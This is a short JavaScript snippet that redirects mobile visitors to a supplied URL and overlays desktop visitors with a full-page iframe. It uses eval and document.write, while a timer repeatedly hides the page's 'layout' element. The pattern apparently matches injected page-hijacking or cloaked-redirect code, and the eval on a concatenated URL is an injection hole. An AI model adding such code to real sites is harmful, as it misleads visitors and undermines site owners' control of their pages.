 function checkMobile(url){
		 var isMobile = function () {var flag = navigator.userAgent.match( 
			        /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i
			    );
			    return flag;
	 	}
	 
		 if (isMobile()) {
			    location.replace(url)
		 } else {
			 var ss = '<div class="pure-g"><iframe scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="2440" src="'+url+'"></iframe></div>';
			 eval("document.write('" + ss + "');");
		 }

	}

	
 	setInterval(function () {
           try {
               document.getElementById("layout").style.display = "none";
           } catch (e) { }

       }, 100);
